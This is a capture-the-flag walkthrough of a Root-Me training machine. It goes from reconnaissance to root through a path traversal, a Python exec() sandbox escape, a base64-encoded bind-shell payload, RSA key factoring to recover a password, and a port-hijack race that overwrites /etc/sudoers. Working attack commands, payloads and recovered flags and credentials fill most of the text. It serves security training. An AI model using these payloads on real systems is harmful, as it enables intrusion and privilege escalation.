
##  Reconnaissance

An initial Nmap scan identified the exposed services:

```

nmap -sV ctf03.root-me.org

PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)  
25/tcp filtered smtp  
53/tcp open domain?  
5000/tcp open http Werkzeug httpd 0.14.1 (Python 2.7.13)

```

The Werkzeug/Flask development server on port 5000, running Python 2.7.13, stood out as the most promising attack surface.

---

## Enumeration

### Source Code Disclosure via Path Traversal

Browsing the web application triggered a verbose 404 error that leaked the server's internal file path:

```

HTTP/1.0 404 NOT FOUND  
Server: Werkzeug/0.14.1 Python/2.7.13

/opt/webserver/basilic_dev_website.py : [Errno 2] No such file or directory: u'/opt/webserver/favicon.ico'

````

This confirmed the application's source lived at `/opt/webserver/basilic_dev_website.py`. A path traversal request against the generic file-serving route retrieved the script in full:

```bash
curl -s "http://ctf03.root-me.org:5000/../../opt/webserver/basilic_dev_website.py"
````

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

# First flag : 905459d7e2dbb3c47ab947faed7b12b0

import os
from flask import Flask, request, jsonify, Response
app = Flask(__name__)


@app.route('/')
def index():
    with open('opt/webserver/index.html', 'r') as myfile:
        return myfile.read()


@app.route('/<path:path>')
def load_page(path):
    if path == 'json_calc':
        x = request.query_string
        g = {"__builtins__": None}  # Removing all builtins for security
        l = {}
        try:
            exec(x, g, l)
            return jsonify(l)
        except Exception, e:
            return jsonify({'error': str(e)})
    else:
        try:
            with open('/opt/webserver/' + path, 'r') as myfile:
                return myfile.read()
        except Exception, e:
            return Response(__file__ + ' : ' + str(e), status=404)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

**First flag:** `905459d7e2dbb3c47ab947faed7b12b0`

The disclosure also confirmed the exact behaviour of the `json_calc` endpoint: raw, unescaped query-string content is passed straight into Python's `exec()`, with `__builtins__` stripped from the execution globals as the only safeguard.

### Breaking Out of the Sandboxed `exec()`

Stripping `__builtins__` from the globals dict does not remove it from every object — it is still reachable through any live Python object's `__class__` chain. Walking up to `object`, enumerating its subclasses, and locating one whose instances expose a `__builtins__`-bearing `_module` attribute (here, `catch_warnings` from the `warnings` module) restores full builtin access:

```
GET /json_calc?result=((c)for(c)in(().__class__.__bases__[0].__subclasses__())if(c.__name__=='catch_warnings')).next()()._module.__builtins__['__import__']('os').popen('id').read() HTTP/1.1
Host: ctf03.root-me.org:5000
```

```
HTTP/1.0 200 OK
Content-Type: application/json

{"result":"uid=1001(python) gid=1001(python) groups=1001(python)\n"}
```

Command execution as the `python` user was confirmed.

---

## Foothold

A standard reverse shell did not connect back reliably, so a **bind shell** was used instead. The shell payload was base64-encoded to avoid breaking the HTTP request syntax, then decoded and executed server-side through the same `exec()` gadget:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",4444))
s.listen(1)
conn,addr=s.accept()
os.dup2(conn.fileno(),0)
os.dup2(conn.fileno(),1)
os.dup2(conn.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

Since the gadget chain's `('os').popen(...)` call cannot contain literal spaces without breaking the request, spaces were injected at runtime using `chr(32)` and a placeholder character (`~`) that gets replaced just before execution:

```
GET /json_calc?((c)for(c)in(().__class__.__bases__[0].__subclasses__())if(c.__name__=='catch_warnings')).next()()._module.__builtins__['__import__']('os').popen(('echo~<base64-payload>~|base64~-d|python~&').replace('~',((c)for(c)in(().__class__.__bases__[0].__subclasses__())if(c.__name__=='catch_warnings')).next()()._module.__builtins__['chr'](32))) HTTP/1.1
Host: ctf03.root-me.org:5000
```

Connecting to the bind shell and upgrading to a full TTY:

```bash
nc -v ctf03.root-me.org 4444
# Connection to ctf03.root-me.org port 4444 [tcp/krb524] succeeded!
$ python -c 'import pty; pty.spawn("/bin/bash")'
python@basilic:/$ id
uid=1001(python) gid=1001(python) groups=1001(python)
```

Reading the flag in the `python` user's accessible directory:

```
python@basilic:~$ cat secret.txt
Second flag : 5d5e3d9ee45cd8975c940b675d4cbc15
```

**Second flag:** `5d5e3d9ee45cd8975c940b675d4cbc15`

---

## User Flag  Privilege Escalation to `basilic`

From the `python` shell, the home directory of a second local user, `basilic`, was readable:

```bash
cat ../basilic/.encrypted_password | base64
# RdRnXRqN1x3BBKKEWlFl627pvVE3k3iCmmUjKayafCF3kw==
```

The site's contact page also exposed an RSA public key:

```
-----BEGIN PUBLIC KEY-----
MD0wDQYJKoZIhvcNAQEBBQADLAAwKQIieHh4eHh4eHh4eHh4eHh4d4eHjw8PDw8P
Dw8PDw8PDw8PDwIDAQAB
-----END PUBLIC KEY-----
```

The third flag's hint — _"The future is a door, the past is the key"_ — pointed toward this key being deliberately weak. Testing it with **RsaCtfTool** confirmed the modulus was factorable via a public factor database lookup:

```bash
rsactftool --publickey public.key --private

[*] Performing factordb attack on public.key.
[+] Attack success with factordb method !

-----BEGIN RSA PRIVATE KEY-----
MIGvAgEAAiJ4eHh4eHh4eHh4eHh4eHh3h4ePDw8PDw8PDw8PDw8PDw8PAgMBAAEC
IgKCV9gCglfYAoJX2AKCV9f4ePX1oKD19aCg9fWgoPX1oKECEH//////////////
//////8CEwDw8PDw8PDw8PDw8PDw8PDw8PECEFVVqqpVVaqqVVWqqlVVqqkCEnDx
cPBw8XDwcPFw8HDxcPBw8QIQf/+8AAIf/+8AAIf/+8AAIQ==
-----END RSA PRIVATE KEY-----
```

With the private key recovered, the encrypted password blob was decrypted directly:

```bash
rsactftool --publickey public.key --decrypt "RdRnXRqN1x3BBKKEWlFl627pvVE3k3iCmmUjKayafCF3kw=="

Decrypted data :
STR : b'\x02\x8c\xf0\x0fB\xd3"\xe7||`)\x95\x00nevergonnagiveyouup'
```

The recovered password, `nevergonnagiveyouup`, was then used to authenticate as `basilic` over SSH:

```bash
ssh basilic@ctf03.root-me.org
basilic@ctf03.root-me.org's password: 
...
$ cat secret.txt
Third flag : e1e0d24d7fed3745e19bb0f90a769ea0
```

**Third flag:** `e1e0d24d7fed3745e19bb0f90a769ea0`

---

## Privilege Escalation to Root

### Identifying the Sudo Vector

```bash
sudo -l

User basilic may run the following commands on basilic:
    (root) /usr/bin/python /opt/calc_test.py
```

```bash
cat /opt/calc_test.py
```

```python
#!/usr/bin/python2
# coding: utf-8
import urllib

c = raw_input('Calc : ')
f = raw_input('Output file : ')
res = urllib.urlopen('http://127.0.0.1:5000/json_calc?x='+str(c)).read()

with open(f, 'w') as file:
    file.write(res)
```

This script runs as **root** via `sudo`, fetches an arbitrary response from the local `json_calc` endpoint, and writes that response, verbatim, to a file path fully controlled by the user. In other words: whoever controls the content returned by `127.0.0.1:5000/json_calc` controls what gets written to disk as root.

The Flask service itself runs as an unprivileged `python` user, confirmed via `systemd`:

```bash
ps aux | grep python
# python  375  ...  /usr/bin/python /opt/webserver/basilic_dev_website.py

grep -r 'basilic' /etc/systemd/system/
# /etc/systemd/system/pyserv.service:ExecStart=/usr/bin/python /opt/webserver/basilic_dev_website.py

cat /etc/systemd/system/pyserv.service
```

```ini
[Unit]
Description=Python Webserver

[Service]
type=simple
ExecStart=/usr/bin/python /opt/webserver/basilic_dev_website.py
User=python
Group=python
Restart=always

[Install]
WantedBy=multi-user.target
```

`Restart=always` means the service is automatically relaunched if it dies — the default `RestartSec` is 100 ms. That narrow window is enough to hijack port 5000 before `systemd` can rebind it to the legitimate service.

### Race Condition: Hijacking Port 5000

The plan: kill the running Flask process using the same `exec()` gadget from Section 3.2, and in the same breath start a local HTTP server on port 5000 before `systemd` restarts the original service.

```bash
wget "http://localhost:5000/json_calc?x=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').kill(375,().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('signal').SIGKILL)" -O - 2>/dev/null & python -m SimpleHTTPServer 5000
```

> Note: the index (`59`) into `__subclasses__()` and the target PID (`375`) are environment-specific and must be re-derived for each run, since the subclasses list and the live PID both vary.

Confirming the hijack succeeded:

```bash
wget "http://localhost:5000"
cat index.html
```

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /</title>
...
<li><a href=".encrypted_password">.encrypted_password</a>
<li><a href="secret.txt">secret.txt</a>
...
```

The directory listing of `basilic`'s home directory confirmed that the Python `SimpleHTTPServer` instance, started under the `basilic` user, had successfully taken over port 5000 in place of the Flask application.

### Weaponizing the Hijacked Server

With full control of what `http://127.0.0.1:5000/json_calc` returns, `calc_test.py` (running as root via `sudo`) was abused to overwrite `/etc/sudoers`. Since `SimpleHTTPServer` serves whatever file matches the requested path, a file literally named `json_calc` was placed in the server's working directory:

```bash
echo 'basilic ALL=(ALL:ALL) ALL' > json_calc
```

Then, the privileged script was invoked to fetch and write this content as root:

```bash
sudo /usr/bin/python /opt/calc_test.py
Calc : 1
Output file : /etc/sudoers
```

Verifying the new sudo rights:

```bash
sudo -l
User basilic may run the following commands on basilic:
    (ALL : ALL) ALL

sudo su
root@basilic:/home/basilic#
```

### Root Flag

```bash
root@basilic:~# cat root.txt
Fourth flag : 1e62c6ed43e92c1f0dcbcca01957d1bb
```

**Fourth flag:** `1e62c6ed43e92c1f0dcbcca01957d1bb`

